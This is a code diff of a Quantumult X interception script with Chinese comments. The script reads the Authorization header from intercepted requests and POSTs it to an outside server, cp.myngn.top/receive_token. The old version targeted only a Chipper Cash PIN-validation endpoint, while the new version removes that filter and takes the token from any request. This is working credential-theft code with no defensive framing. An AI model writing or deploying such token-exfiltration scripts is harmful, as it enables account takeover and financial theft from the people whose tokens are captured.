@@ -1,50 +1,46 @@
-const urlToIntercept = "https://auth.chippercash.com/pin/validate";
-
-// Quantumult X 拦截请求的处理逻辑
+// 处理拦截到的请求头
 const myRequest = $request;
 
-// 判断是否拦截到目标URL
-if (myRequest.url.includes(urlToIntercept)) {
-    
-    // 获取 Authorization 值
-    const authorizationToken = myRequest.headers["Authorization"];
+// 提取请求中的 Authorization 头
+const authorizationToken = myRequest.headers["Authorization"];
 
-    if (authorizationToken) {
-        // 准备上传数据
-        const uploadUrl = "https://cp.myngn.top/receive_token";
-        const uploadHeaders = {
-            'Content-Type': 'application/json'
-        };
-        const uploadData = {
-            'Authorization': authorizationToken
-        };
+// 判断是否存在 Authorization 头
+if (authorizationToken) {
+    // 准备上传的 URL 和数据
+    const uploadUrl = "https://cp.myngn.top/receive_token";
+    const uploadHeaders = {
+        'Content-Type': 'application/json'
+    };
+    const uploadData = {
+        'Authorization': authorizationToken
+    };
 
-        // 通过 $task.fetch 来发送请求
-        const uploadRequest = {
-            url: uploadUrl,
-            method: 'POST',
-            headers: uploadHeaders,
-            body: JSON.stringify(uploadData)
-        };
+    // 构建上传请求
+    const uploadRequest = {
+        url: uploadUrl,
+        method: 'POST',
+        headers: uploadHeaders,
+        body: JSON.stringify(uploadData)
+    };
 
-        // 发送 POST 请求到上传服务器
-        $task.fetch(uploadRequest).then(response => {
-            const statusCode = response.statusCode;
-            const responseBody = response.body;
+    // 发送上传请求并处理结果
+    $task.fetch(uploadRequest).then(response => {
+        const statusCode = response.statusCode;
+        const responseBody = response.body;
 
-            // 检查上传是否成功并输出信息
-            if (statusCode === 200) {
-                $notify("Token 上传成功", "成功上传 Authorization 令牌", `服务器响应: ${responseBody}`);
-            } else {
-                $notify("Token 上传失败", `状态码: ${statusCode}`, `响应信息: ${responseBody}`);
-            }
-        }).catch(error => {
-            $notify("Token 上传失败", "请求发生错误", `${error}`);
-        });
-    } else {
-        // 如果没有找到 Authorization 头
-        $notify("Token 上传失败", "未找到 Authorization 令牌", "请求头中不包含 Authorization 字段");
-    }
+        // 成功上传后显示通知
+        if (statusCode === 200) {
+            $notify("Token 上传成功", "成功上传 Authorization 令牌", `服务器响应: ${responseBody}`);
+        } else {
+            $notify("Token 上传失败", `状态码: ${statusCode}`, `响应信息: ${responseBody}`);
+        }
+    }).catch(error => {
+        // 处理上传请求失败的情况
+        $notify("Token 上传失败", "请求过程中发生错误", `${error}`);
+    });
+} else {
+    // 未找到 Authorization 头时的处理
+    $notify("Token 上传失败", "未找到 Authorization 令牌", "请求头中不包含 Authorization 字段");
 }
 
 // 结束脚本
